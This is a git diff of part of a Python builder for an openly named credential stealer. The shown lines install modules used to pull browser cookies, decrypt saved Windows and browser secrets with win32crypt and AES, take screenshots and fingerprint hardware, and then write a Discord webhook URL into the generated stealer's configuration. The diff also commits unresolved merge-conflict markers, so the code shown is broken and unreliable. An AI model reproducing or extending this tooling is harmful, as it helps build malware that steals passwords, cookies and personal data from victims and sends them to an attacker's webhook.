@@ -1503,6 +1503,7 @@ print(f"{color.RED}\n[!] | Installing missing modules:{color.RESET}")
 
 subprocess.check_call(['pip', 'install', '--upgrade', 'discord.py'])
 
+<<<<<<< HEAD:Settings/Program/Builder-Stealer.py
 ModuleInstall("screeninfo")
 ModuleInstall("psutil")
 ModuleInstall("GPUtil")
@@ -1513,6 +1514,118 @@ ModuleInstall("discord")
 ModuleInstall("pywin32")
 ModuleInstall("Pillow")
 ModuleInstall("browser_cookie3")
+=======
+try:
+   import platform
+except:
+   ModuleInstall("platform")
+try:
+   import ctypes
+except:
+   ModuleInstall("ctypes")
+
+try:
+   import screeninfo
+except:
+   ModuleInstall("screeninfo")
+
+try:
+   import psutil
+except:
+   ModuleInstall("psutil")
+
+try:
+   import GPUtil
+except:
+   ModuleInstall("GPUtil")
+
+try:
+   import sqlite3
+except:
+   ModuleInstall("sqlite3")
+
+try:
+   import json
+except:
+   ModuleInstall("json")
+
+try:
+   import socket
+except:
+   ModuleInstall("socket")
+
+try:
+   import requests
+except:
+   ModuleInstall("requests")
+
+try:
+   from Crypto.Cipher import AES
+except:
+   ModuleInstall("pycryptodome")
+
+try:
+   import datetime
+except:
+   ModuleInstall("datetime")
+
+try:
+   import base64
+except:
+   ModuleInstall("base64")
+
+try:
+   import re
+except:
+   ModuleInstall("re")
+try:
+   import string
+except:
+   ModuleInstall("string")
+try:
+   import win32api
+except:
+   ModuleInstall("win32")
+try:
+   import discord
+except:
+   ModuleInstall("discord")
+   ModuleInstall("discord.py")
+try:
+   import sys
+except:
+   ModuleInstall("sys")
+try:
+   import shutil
+except:
+   ModuleInstall("shutil")
+try:
+   import pathlib
+except:
+   ModuleInstall("pathlib")
+try:
+   import zipfile
+except:
+   ModuleInstall("zipfile")
+try:
+   import win32crypt
+except:
+   ModuleInstall("win32crypt")
+   ModuleInstall("win32")
+try:
+   import uuid
+except:
+   ModuleInstall("uuid")
+try:
+   from PIL import ImageGrab
+except:
+   ModuleInstall("pyautogui")
+   ModuleInstall("imagegrab")
+try:
+   import browser_cookie3
+except:
+   ModuleInstall("browser_cookie3")
+>>>>>>> f470bc26151010e26c0a6ffcffb444e6adb7a27b:Settings/Program/BuilderGrab.py
 
 with open(file_text, 'w', encoding='utf-8') as file:
  file.write(f"webhook_url = \"{webhook}\"")
